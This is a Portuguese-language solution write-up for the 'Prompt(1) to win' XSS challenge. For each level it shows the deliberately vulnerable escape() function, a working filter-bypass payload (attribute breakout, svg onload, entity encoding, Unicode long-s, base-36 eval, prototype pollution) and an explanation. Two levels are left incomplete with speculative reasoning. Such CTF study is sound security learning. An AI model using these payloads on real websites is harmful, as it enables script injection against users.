# Prompt(1) to win

###### Solved by @milelaraia

Este é um desafio de XSS voltado para a utilização de técnicas de injeção em código JavaScript. O mesmo contém 15 fases com diferentes tipos de filtros que devem ser desviados, além disso o comando prompt(1) deve ser executado para concluir as tarefas.

## About the Challenge

O desafio `Prompt(1) to win` fornece 15 fases que aumentam de dificuldade gradativamente. O objetivo consiste em exigir que o atacante encontre meios para contornar os filtros de input impostos em códigos de JavaScript e além de executar o código prompt(1).

## Solution

#### Desafio 0: Injeção via Concatenação Direta em Atributo HTML
- Código vulnerável:
[![imagem-2025-05-12-001458870.png](https://i.postimg.cc/J0G6ht67/imagem-2025-05-12-001458870.png)](https://postimg.cc/T5vq72vB)

```bash
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}        
```
- Payload funcional:
```bash
"><script>prompt(1)</script>
```
- Explicação:

A vulnerabilidade ocorre quando a entrada do usuário é inserida diretamente no atributo value de uma tag HTML, sem sanitização ou escape. Um atacante pode fechar o atributo com `"`, encerrar a tag com `>`, e injetar uma tag `<script>` maliciosa.
[![imagem-2025-05-12-002654911.png](https://i.postimg.cc/SKy8m3RD/imagem-2025-05-12-002654911.png)](https://postimg.cc/jDFCX8z7)

#### Desafio 1: remoção de tags com regex - ExtJS library
- Código vulnerável:
[![imagem-2025-05-12-003005221.png](https://i.postimg.cc/hjYpzc7S/imagem-2025-05-12-003005221.png)](https://postimg.cc/jwzzBVX9)

```bash
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}        
```
- Payload funcional:
```bash
<svg onload=prompt(1)
```
- Explicação:


Esta fase envolve a regex `/<\/?[^>]+>/gi` que substitui tags HTML que contém `<...>` e os substitui por uma string vazia. O ataque inicia uma tag SVG e define um manipulador de eventos que executa `prompt(1)` assim que o SVG é carregado.
[![imagem-2025-05-12-005627602.png](https://i.postimg.cc/wjNqWY83/imagem-2025-05-12-005627602.png)](https://postimg.cc/Wd2c3K4P)

#### Desafio 2: filtro de "=" e "("
- Código vulnerável:
[![imagem-2025-05-12-005937026.png](https://i.postimg.cc/wxVYjTHh/imagem-2025-05-12-005937026.png)](https://postimg.cc/SjJvZ4ns)

```bash
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        
```
- Payload funcional:
```bash
<svg><script>prompt&#40;1)</script>
```
- Explicação:

A função remove os seguintes caracteres específicos = e ( usando a expressão regular `/[=(]/g, ''`. Para contornar esse filtro usa-se um payload que não contenha tais caracteres, transformando os mesmos em entidades HTML, `&#40;`, quando o navegador renderiza o código, a entidade é convertida de volta para `(`, permitindo que o `prompt(1)` seja executado.
[![imagem-2025-05-12-011047295.png](https://i.postimg.cc/tJmCYFwM/imagem-2025-05-12-011047295.png)](https://postimg.cc/vxfdKxQr)

#### Desafio 3: remoção de "-->" e comentário HTML
- Código vulnerável:
[![imagem-2025-05-12-011337451.png](https://i.postimg.cc/0NbQ1W4J/imagem-2025-05-12-011337451.png)](https://postimg.cc/gwbdvDmY)

```bash
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}        
```
- Payload funcional:
```bash
--!><script>prompt(1)</script>
```
- Explicação:

A função implementada tenta comentar a entrada do usuário dentro de um bloco HTML `<!--...-->` para evitar a execução de scripts. Além disso, substitui `->` por `_`para evitar quebra de comentários. O uso de `--!>`serve para fechar o comentário HTML antecipadamente, permitindo que o payload seja interpretado como código não comentado e assim, executado.
[![imagem-2025-05-12-012408924.png](https://i.postimg.cc/L6vDyDZ1/imagem-2025-05-12-012408924.png)](https://postimg.cc/JGDj0bxr)

#### Desafio 5: filtro de ">", "on...=" e "focus"
- Código vulnerável:
[![imagem-2025-05-12-014424622.png](https://i.postimg.cc/DZD4NWPL/imagem-2025-05-12-014424622.png)](https://postimg.cc/9RdfRQSQ)

```bash
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}        
```
- Payload funcional:
``` bash
"type=image src onerror 
="prompt(1)
```
- Explicação:

A função utilizada nesta fase substitui qualquer sequência que comece com `on` seguida de `=`, `>` e a palavra `focus` por `_`. Para contornar esse acontecimento o payload usa `onerror =` com um salto de linha antes do `=`, burlando a regex.
[![imagem-2025-05-12-015406132.png](https://i.postimg.cc/4dc0SSD5/imagem-2025-05-12-015406132.png)](https://postimg.cc/ph2k9qXh)

#### Desafio 6: redirecionamento via form e src=javascript:

- Código vulnerável:
[![imagem-2025-05-12-015740531.png](https://i.postimg.cc/Fz8VXr0k/imagem-2025-05-12-015740531.png)](https://postimg.cc/FkbLjQWh)

```bash
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '                         \n\
<script>                                                  \n\
    // forbid javascript: or vbscript: and data: stuff    \n\
    if (!/script:|data:/i.test(document.forms[0].action)) \n\
        document.forms[0].submit();                       \n\
    else                                                  \n\
        document.write("Action forbidden.")               \n\
</script>                                                 \n\
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}        
```
- Payload funcional:
```bash
javascript:prompt(1)#{"action":1}
```
- Explicação:

A função implementada recebe um input `URL#JSON`, onde cria um formulário HTML com os dados do JSON e o submete via POST. Além de incluir um script que verifica se não contém `javascript:` ou `data:` antes de enviar. Para desviar as atribuições, o atacante injeta um payload onde a verificação `!/script:|data:/i.test(...)` só ocorre depois que o formulário já foi criado com `action=javascript:prompt(1)` e executa o `prompt(1)` antes mesmo do `submit()`.
[![imagem-2025-05-12-015959150.png](https://i.postimg.cc/9Fw6k19z/imagem-2025-05-12-015959150.png)](https://postimg.cc/tYyvZ32H)

#### Desafio 7: limite de 12 caracteres e múltiplos segmentos

- Código vulnerável:
[![imagem-2025-05-12-113126711.png](https://i.postimg.cc/L4cxXj0g/imagem-2025-05-12-113126711.png)](https://postimg.cc/t7z3vnb9)

```bash
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}        
```
- Payload funcional:
```bash
"><svg/a=#"onload='/*#*/prompt(1)'
```
- Explicação:

A função divide o input usando `#` como delimitador e gera parágrafos com o atributo `title` contendo os 12 primeiros caracteres de cada segmento. Para desviar as atribuições o payload usa primeiramente um `">` para fechar o `title`, em seguida um `<svg/a=` é interpretado como tag SVG, o que executa o `onload='/*...*/prompt(1)'` quando carregado.
[![imagem-2025-05-12-113936233.png](https://i.postimg.cc/mDLM5gDw/imagem-2025-05-12-113936233.png)](https://postimg.cc/CZ2zZYbB)

#### Deasfio 9:  regex <[a-zA-Z], uppercase forçado e tag

- Código vulnerável:
[![Captura-de-tela-2025-05-12-125921.png](https://i.postimg.cc/xTTFQ2sp/Captura-de-tela-2025-05-12-125921.png)](https://postimg.cc/HjRt0f1b)

```bash 
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}        
```
- Payload funcional:
```bash
<ſvg/onload=&#112;&#114;&#111;&#109;&#112;&#116;&#40;&#49;&#41;>
```
- Explicação:

Esta função escape faz duas coisas, substitui `<` seguido de uma letra por `<_[letra]` e converte todo input para maiúsculas. O payload contorna as defesas com um `<ſvg` (com `ſ` Unicode, que parece `s` mas não é afetado por `toUpperCase()`) e um `onload` com entidades HTML para codificar `prompt(1)`.
[![imagem-2025-05-12-131040530.png](https://i.postimg.cc/7hF63kZ3/imagem-2025-05-12-131040530.png)](https://postimg.cc/bSRpP4br)

#### Desafio A: encodeURIComponent + filtro de prompt

- Código vulnerável:
[![imagem-2025-05-12-131322986.png](https://i.postimg.cc/vBkhLBg2/imagem-2025-05-12-131322986.png)](https://postimg.cc/tZdF99zF)

```bash
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}        
```
- Payload funcional:
```bash
p'rompt(1)
```
- Explicação:

São aplicadas duas transformações no input. Primeiramente codifica o input com `encodeURIComponent`, depois substitui `prompt`por `alert` e por fim remove as aspas simples. Para evitar as substituições usa-se `p'rompt`, e assim a função remove `'` transformando em `prompt(1)`.
[![imagem-2025-05-12-132414100.png](https://i.postimg.cc/Nf6qNy8H/imagem-2025-05-12-132414100.png)](https://postimg.cc/hft5vt5D)

#### Desafio B: Manipulação de JSON e injeção de script

- Código vulnerável:
[![imagem-2025-05-12-132615816.png](https://i.postimg.cc/RFgyrfsP/imagem-2025-05-12-132615816.png)](https://postimg.cc/zbR0KL1W)

```bash
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '                                \n\
<script>                                    \n\
    var data = ' + dataString + ';          \n\
    if (data.action === "login")            \n\
        document.write(data.message)        \n\
</script> ';
}        
```
- Payload funcional:
```bash
"(prompt(1))in"
```
- Explicação:

A função remove caracteres especiais usando uma regex `/[[|\s+*/\\<>&^:;=~!%-]/g, ''` e concatena o input em uma string JSON. O payload foi projetado para burlar a regex, já que ela não remove nem `()` nem `"` e o navegador o interpreta como código JS.
[![imagem-2025-05-12-133421010.png](https://i.postimg.cc/GhRqRRSW/imagem-2025-05-12-133421010.png)](https://postimg.cc/F1PjbMvp)

#### Desafio C: encodeURIComponent + filtro de prompt

- Código vulnerável:
[![imagem-2025-05-12-133632924.png](https://i.postimg.cc/xCNrHQvf/imagem-2025-05-12-133632924.png)](https://postimg.cc/xJQFDWph)

```bash
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}        
```
- Payload funcional:
```bash
eval(1558153217..toString(36))(1)
```
- Explicação:

Existem duas etapas de sanitização, uma codificação de input com `encodeURIComponent` e uma remoção de `'` com substituição de `prompt` por `alert`. Para burlar as defesas não há nada que caia na sanitização, então usa-se `1558153217..toString(36)` que resulta na string `prompt` (base 36) e executa o ataque.
[![imagem-2025-05-12-134643414.png](https://i.postimg.cc/W3yWPYHh/imagem-2025-05-12-134643414.png)](https://postimg.cc/hz9bLsgB)

#### Desafio D: Manipulação de Prototypo e Injeção de onerror

- Código vulnerável:
[![imagem-2025-05-12-135021675.png](https://i.postimg.cc/66M2B2tJ/imagem-2025-05-12-135021675.png)](https://postimg.cc/dDTtB0h4)

```bash
function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources) 
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}
```
- Payload funcional:
```bash
{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
```
 - Explicação:

 A função analisa um JSON de entrada para configurar uma imagem, usa `_.extend` para mesclar o input com valores padrão, além de filtrar certos caracteres especiais com a regex `/[^\w:\/.]/` e remover aspas. O payload define `source`no protótipo do objeto, afetando `config.source` após `extend`. O navegador interpreta ` como delimitador de string, tornando onerror=prompt(1) executável.
 [![imagem-2025-05-12-140128981.png](https://i.postimg.cc/rFrvTHtB/imagem-2025-05-12-140128981.png)](https://postimg.cc/8jTyBt44)

 #### Desafio F: Limitação de Tamanho e Quebra de Entrada

 - Código vulnerável:
 [![imagem-2025-05-12-140334820.png](https://i.postimg.cc/zGg5djNj/imagem-2025-05-12-140334820.png)](https://postimg.cc/75wphSfG)

 ```bash
 function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
} 
```
- Payload funcional:
``` bash
"><script>`#${prompt(1)}#`</script>
```
- Explicação:

A função remove asteriscos do input, o divide me segmentos usando `#` e gera parágrafos, onde cada segmento é truncado para 15 caracteres. O payload é projetado para quebrar o contexto HTML `(">)` e fechar o atributo `title`, além de injetar uma tag `<script>` com um template string para executar o JS, e, usar `#` para dividir o payload em segmentos que serão mesclados na saída.
[![imagem-2025-05-12-141159338.png](https://i.postimg.cc/02Kz77zY/imagem-2025-05-12-141159338.png)](https://postimg.cc/vcM8sgLT)

#### Desafio 4 (Incompleto)

- Código vulnerável:
[![imagem-2025-05-12-141359510.png](https://i.postimg.cc/L6rMwbmW/imagem-2025-05-12-141359510.png)](https://postimg.cc/kBFZtw6N)

```bash
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}        
```
A função só pode ser validada se o input corresponder ao padrão `^(?:https?:)?\/\/prompt\.ml\/js\/test\.js` (via regex), permitindo apenas URLs como `http(s)://prompt.ml/js/test.js`. Caso contrário, retorna `Invalid resource.`.

- Possível solução:

O código só aceitará um script externo se o payload fornecer exatamente a URL `https://prompt.ml/js/test.js` (ou sua versão HTTP/codificada). Qualquer outra tentativa (como URLs maliciosas ou diferentes) irá resultar no erro `Invalid resource`, garantindo que apenas a origem permitida seja executada.

#### Desafio E (Incompleto)

- Código vulnerável:
[![imagem-2025-05-12-142432026.png](https://i.postimg.cc/3xJXGY4M/imagem-2025-05-12-142432026.png)](https://postimg.cc/KRw3SXDQ)

```bash
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
}
```
O código processa a URL fornecida através das seguintes etapas: conversão para maiúsculas, substituição de `//` por `data:`, e outras normalizações, com o objetivo final de gerar uma tag `<img>` válida.

- Possível solução:

O código foi projetado para bloquear URLs externas, aceitando apenas URLs no formato `data:`. Essa abordagem impede a execução de payloads maliciosos através de links externos convencionais, mas ainda deixa uma possível brecha de segurança. Seria possível caso o domínio seja controlável ou se explore vulnerabilidades no processamento de data URIs, assim, poderia injetar um código malicioso. 
